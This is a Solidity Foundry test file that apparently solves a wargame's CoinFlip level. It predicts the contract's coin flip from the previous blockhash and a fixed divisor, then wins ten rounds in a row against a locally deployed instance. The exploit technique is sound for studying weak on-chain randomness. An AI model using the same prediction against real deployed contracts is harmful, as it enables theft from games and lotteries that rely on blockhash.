// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "lib/forge-std/src/Test.sol";
import {console} from "lib/forge-std/src/console.sol";
import {CoinFlip} from "../src/level-3_CoinFlip.sol";

contract CoinFlipExploit is Test
{
  CoinFlip cf;

  function setUp() public
  {
    cf = new CoinFlip();
  }

  function testExploit() public
  {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 blockValue;

    for (uint256 i = 0; i < 10; i++)
    {
      blockValue = uint256(blockhash(block.number - 1)); 

      if ((blockValue / FACTOR) == 1)
        cf.flip(true);
      else
        cf.flip(false); 

      vm.roll(block.number + 1);
    }
    console.log(cf.consecutiveWins());
  }
}
